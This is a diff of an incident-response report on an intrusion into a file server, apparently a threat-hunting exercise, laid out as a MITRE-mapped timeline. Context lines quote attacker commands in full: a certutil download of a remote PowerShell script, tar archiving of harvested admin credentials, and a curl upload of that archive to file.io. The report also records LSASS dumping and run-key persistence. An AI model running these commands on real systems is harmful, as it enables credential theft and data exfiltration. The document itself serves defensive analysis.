@@ -49,6 +49,8 @@ This report documents each phase of the intrusion and the analytical steps taken
 
 This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.
 
+---
+
 ### Initial Access & Return Activity
 
 Nov 19, 2025 7:10:42 PM
@@ -71,6 +73,8 @@ Event: External logon from 159.26.106.98
 
 Technique: Initial Access (TA0001)
 
+---
+
 ### Lateral Movement to File Server
 
 Nov 22, 2025 12:11:14 AM
@@ -83,6 +87,8 @@ Event: Remote logon from 10.0.8.4
 
 Technique: Remote Services (T1021)
 
+---
+
 ### System & Network Discovery
 | Timestamp   | Command                 | Technique                        |
 | ----------- | ----------------------- | -------------------------------- |
@@ -92,6 +98,8 @@ Technique: Remote Services (T1021)
 | 12:42:46 AM | `ipconfig /all`         | Network Config Discovery (T1016) |
 
 Device: azuki-fileserver01 — Account: fileadmin
+
+---
 
 ### Defense Evasion
 
@@ -103,6 +111,8 @@ Purpose: Hide staging folder
 
 Technique: Hidden Files & Directories (T1564.001)
 
+---
+
 ### Ingress Tool Transfer
 
 12:58:24 AM
@@ -112,6 +122,8 @@ Command: `certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs
 Technique: Ingress Tool Transfer (T1105)
 
 Device: azuki-fileserver01 — Account: fileadmin
+
+---
 
 ### Collection & Data Staging
 
@@ -127,6 +139,8 @@ File Created: IT-Admin-Passwords.csv
 
 Technique: Credentials Harvesting (T1552)
 
+---
+
 ### Compression of Staged Data
 
 1:25:31 AM
@@ -134,6 +148,8 @@ Technique: Credentials Harvesting (T1552)
 Command: `tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`
 
 Technique: Archive Collected Data (T1560.001)
+
+---
 
 ### Credential Access
 
@@ -145,6 +161,8 @@ Output: lsass.dmp memory dump
 
 Technique: OS Credential Dumping (T1003.001)
 
+---
+
 ### Exfiltration to Cloud Storage
 
 2:06:08 AM
@@ -152,6 +170,8 @@ Technique: OS Credential Dumping (T1003.001)
 Command: `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
 
 Technique: Exfiltration to Cloud Storage (T1567.002)
+
+---
 
 ### Persistence Mechanism
 
@@ -163,6 +183,8 @@ Payload: svchost.ps1
 
 Technique: Registry Run Keys (T1547.001)
 
+---
+
 ### Anti-Forensics / Cleanup
 
 2:26:01 AM
@@ -170,3 +192,5 @@ Technique: Registry Run Keys (T1547.001)
 File Deleted: ConsoleHost_history.txt
 
 Technique: Clear Command History (T1070.003)
+
+---
